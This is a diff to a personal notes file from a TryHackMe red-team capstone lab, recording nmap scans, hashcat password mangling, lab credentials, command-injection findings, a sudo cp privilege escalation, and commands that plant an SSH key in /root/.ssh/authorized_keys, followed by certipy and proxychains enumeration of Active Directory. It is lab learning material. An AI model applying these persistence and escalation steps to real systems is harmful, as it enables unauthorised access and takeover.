@@ -177,7 +177,7 @@ Given that Tyler does know what `-e` flag for nmap does and I also want to be mo
 
 While I was being to overthink the addressing part
 ![](vpninternalnetworksexplained.png)
-It is just in the vpn output.
+It is just in the vpn output. 
 
 ```bash
 sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,389,443,445,464,636,3306,3389,5000,9389 -e tun0 172.32.5.21/32
@@ -197,7 +197,7 @@ A temporary wordlist to the wordlist problem of problems solution for < 38K word
 cat /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt && cat /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt #&& cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt |  sort -u > betterRaftandDirb.txt
 ```
 
-There is a vpns directory to fuzz. If we have a username format we can fuzz it. I forgot to reset the network and then the vpn key  1:40 tyler
+There is a vpns directory to fuzz. If we have a username format we can fuzz it. I forgot to reset the network and then the vpn key.
 
 Alh4zr3d goes full sliver and re-introduces me to the wonder of [ScareCrow](https://github.com/optiv/ScareCrow) - need to play with this 
 
@@ -206,7 +206,7 @@ Alh4zr3d goes full sliver and re-introduces me to the wonder of [ScareCrow](http
 
 Tyler references [Orange-Cyberdefense Mindmaps](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg), which is a extensive mindmap of AD attacks.
 
-At this point after watching [Alh4zr3d live](https://www.twitch.tv/videos/1823317510) I decided to approach this by preparing to be able to bypass EDR, AV first before continuing with The VPN route. I want to follow both methods and check Tib3rious's way in before getting the second domain controller. As objective go the main problem is that I neither have to time or experience over the coming weeks to dedicate to bypassing EDR for the first time without some tried a true way. I acknowledge the hand-holding to success with dedicating a significant amount of write and research work for my Archive Project to learn as much from others sturggles. To save myself time in the future struggle of HTB ProLabs that I will hopeful do next year. Guessing that Tyler will probably gain a foothold I started by considering my options before going through other paths with [Part 2 of Tyler RTCC video](https://www.youtube.com/watch?v=TUyYUSr0O_Y&t=536s). [am03bam4n](https://tryhackme.com/p/am03bam4n) was present on this stream and explained that the VPN instability is reflective of the real world - what I took from this is that actually we need away from using the corpusername.ovpn as soon as possible. 
+At this point after watching [Alh4zr3d live](https://www.twitch.tv/videos/1823317510) I decided to approach this by preparing to be able to bypass EDR, AV first before continuing with The VPN route. I want to follow both methods and check Tib3rious's way in before getting the second domain controller. As objective go the main problem is that I neither have to time or experience over the coming weeks to dedicate to bypassing EDR for the first time without some tried a true way. I acknowledge the hand-holding to success with dedicating a significant amount of write and research work for my Archive Project to learn as much from others sturggles. To save myself time in the future struggle of HTB ProLabs that I will hopeful do next year. Guessing that Tyler will probably gain a foothold I started by considering my options before going through other paths with [Part 2 of Tyler RTCC video](https://www.youtube.com/watch?v=TUyYUSr0O_Y). [am03bam4n](https://tryhackme.com/p/am03bam4n) was present on this stream and explained that the VPN instability is reflective of the real world - what I took from this is that actually we need away from using the corpusername.ovpn as soon as possible. 
 
 `fping` is better than `ping`
 ```bash
@@ -227,7 +227,85 @@ nmcli
 Tyler went deep into the web application:
 ![](wehaveuserenum.png)
 
-51 minutes  in..
+Password Mangling - instead of the extensive ChatGPT usage I went for search engines - https://github.com/NotSoSecure/password_cracking_rules.git, because although AI is great as a service it is not is commonly wrong, but the tone of authority and some of the syntax used is both irratating and also really dangerous. It is very sure it is correct that it search the internet better that you. Also it is slow and filtering for "safety". And to top it off there are better open source version that I need to look into before all the sad tech companies failing to hit profit try to restrict the entire market and eco-system to save themselves not everyone else. Continuing on with [Part 3 with Tyler](https://www.youtube.com/watch?v=svdhIyifHC8) and [Finishing the AV evasion stream for the knowledge](https://www.twitch.tv/videos/1823317510)...but Al had a rough time and I 
+
+```bash
+# Download the OneRuleToRuleThemAll
+curl -L https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule -o OneRuleToRuleThemAll.rule  
+# Remove the case insensitive duplicates to save 300k  
+cat password_base_list.txt | uniq -i > better_base_password_list.txt
+# Create a wordlist with hashcat to improve my cheatsheets 
+hashcat --force better_base_password_list.txt -r ../OneRuleToRuleThemAll.rule --stdout > Bpbl-ORTRTA.txt
+# Reduce by another 10k word for 309K words
+cat Bpbl-ORTRTA.txt | uniq > Bpbl-ORTRTA.txt
+```
+
+laura.wood@thereserve.loc : Password1@ for the [[Red-Team-Capstone-Challenge-Credentials]], but I already have that from a previous attempt, but ... it is 240574 in the smaller OneRuleToRuleThemAll list, so this better for password cracking than spraying. A win for `mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst`
+![](laurais240574.png)
+
+[37:54](https://www.youtube.com/watch?v=svdhIyifHC8) - My VPN or the server is already patched behind someone already ahead of me.
+
+Press submit for free VPN keys
+![](laurawoodvpnlogin.png)
+
+WE ARE MOHAMMAD - rdp access finally!!!
+![](wearemohammad.png)
+
+![](wehaveping.png)
+Then the machine shutdown.
+
+Then al finds cmd injection
+![](alhappywecansleeptheserver.png)
+
+My suspicioon of the multitude of hole in the bank to poke at are many
+![](alfindcmdi.png)
+
+Password in DB connect
+![](dbconnect.png)
+
+vpn : password1!
+
+![](sudolvpnserver.png)
+
+![](lisamorepass.png)
+
+lisa.moore : Scientist2006
+
+[gtfobins cp](https://gtfobins.github.io/gtfobins/cp/#sudo)
+```
+LFILE=file_to_write
+echo "DATA" | sudo cp /dev/stdin "$LFILE"
+```
+
+Al wants to pivot, but then wants to overwrite ssh. Sshimple is better
+```bash
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/zc3tx/DGZGDr7KWUlAzH5stPT7oySNhZqe+1snxmByRA7kiIIp8tly12x7vxFCvwhf7R7Sp1qR0Pzi5S5uAGO//+YD4ukVDtzA0F0oi2KjWsGZB5I0HUp7QERY8nb9yL3rfTC6HIMF0cCBUU0zNkVnCSYeZDG7WePSp7lblIOBmHd54a+3UAaShQc8Fadk0IQchW8MAvRcyQM7J0F2fT/aPTmUbv77VrUWFapgwuUBydXZA9eu+YOn9y1g5ID3QL6UpVHjNAjXPw1byRiyMRPUZcCL9No5fNa7Lu3e6xqB7qvgT20CQuohkpckWBroFoitG/K0VVsFFwQWaXvZGLwKJtvBwscDVIcFdoqfUO9JNNZ9G0Q97t1CZTuT9vRLvlRyOp1gir/iE45hCzchmpz8SM4RvGo8gvpnKWy8//noDas6nXqRxwvAEKe2S4nbSFBD5Xt7gTOH1gukutcN0TDQ+Iw0tYNXpHnIgKzhx/CseyPd+1KPhbTtq5T44W9yc=" > authorized_keys
+sudo cp authorized_keys /root/.ssh/authorized_keys
+```
+
+![](cpintoroot.png)
+
+Went on a bit of tangent with how Proxychains works
+
+SSH tunnel 
+
+Proxychains
+
+Crackmap Exec
+
+Certipy - 101 with Al
+```
+proxychains certipy find -u 'lisa.moore' -p 'Scientist2006' -dc-ip 10.200.X.102
+```
+
+Web Enrollment is web-based builtin interface to enrollment, which uses ntlm authentication.
+
+Web Enrollment : Disabled - not real life, NTLM relay attack if we could
+Look at Enrollment Rights
+
+If we have get SYSTEM access on Server 1 then we DC because of the Enrollment rights.
+
+Bloodhound run with --tcp-dns uses dns over tcp which works better over proxychains
 
 ## Perimeter Breach
 ## Initial Compromise of Active Directory
